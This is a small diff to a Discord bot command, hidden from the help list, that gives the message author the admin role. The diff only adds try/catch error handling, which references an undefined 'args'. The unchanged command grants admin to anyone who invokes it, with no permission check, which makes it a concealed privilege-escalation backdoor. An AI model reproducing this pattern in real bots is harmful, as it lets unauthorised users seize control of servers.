@@ -5,10 +5,15 @@ module.exports = {
 	description : "Give author admin role",
 	options: {ShowInHelp: false},
 	run : function(msg, client, disc){
-		msg.guild.roles.fetch(client.roleId.admin) // Get admin rank using its role id
+		try{
+			msg.guild.roles.fetch(client.roleId.admin) // Get admin rank using its role id
 			.then(role => {
 				msg.member.roles.add(role);
-			})
+			});
+        }catch(e){
+            client.eventEm.emit('CommandError', msg, this.name, args, e)
+        }
+		
 	}
 
 }
